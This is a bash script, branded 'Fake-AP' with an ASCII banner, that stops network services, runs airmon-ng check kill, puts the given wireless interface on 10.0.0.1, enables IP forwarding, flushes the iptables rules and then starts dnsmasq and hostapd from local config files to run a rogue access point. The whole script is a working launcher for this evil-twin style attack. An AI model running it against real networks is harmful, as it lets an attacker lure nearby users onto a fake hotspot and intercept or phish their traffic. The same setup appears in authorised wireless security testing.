#!/bin/bash


printf "\e[1;77m8888888888       888                           \e[0m\e[1;92md8888 8888888b. \e[0m\n" 
printf "\e[1;77m888              888                          \e[0m\e[1;92md88888 888   Y88b \e[0m\n"
printf "\e[1;77m888              888                         \e[0m\e[1;92md88P888 888    888 \e[0m\n"
printf "\e[1;77m8888888  8888b.  888  888  .d88b.           \e[0m\e[1;92md88P 888 888   d88P \e[0m\n"
printf "\e[1;77m888          88b 888 .88P d8P  Y8b         \e[0m\e[1;92md88P  888 8888888P  \e[0m\n"
printf "\e[1;77m888     .d888888 888888K  88888888 888888 \e[0m\e[1;92md88P   888 888        \e[0m\n"
printf "\e[1;77m888     888  888 888  88b Y8b.           \e[0m\e[1;92md8888888888 888        \e[0m\n"
printf "\e[1;77m888      Y888888 888  888   Y8888       \e[0m\e[1;92md88P     888 888\e[0m\e[1;77m \e[0m\n"
printf "\n"
printf "\e[1;31m                   .-  _           _  -. \n"
printf "                  /   /             \   \ \n"
printf "                 (   (  (\` (-o-) \`)  )   ) \n"
printf "                  \   \_ \`  -+-  \` _/   / \n"
printf "                   \`-       -+-       -\` \n"
printf "                            -+- \e[0m\e[1;77m\e[0m\n"
printf "\n"

interface=$1
#stop AP 
systemctl restart NetworkManager.service
service hostapd stop
service apache2 stop
service dnsmasq stop
service rpcbind stop
killall dnsmasq
killall hostapd


#systemctl disable-resolved.service
#systemctl stop systemd-resolved

#create the fake AP
service network-manager stop
airmon-ng check kill
ifconfig $interface 10.0.0.1 netmask 255.255.255.0
route add default gw 10.0.0.1

echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT

#run the fake AP
dnsmasq -C dnsmasq.conf
hostapd hostapd.conf 
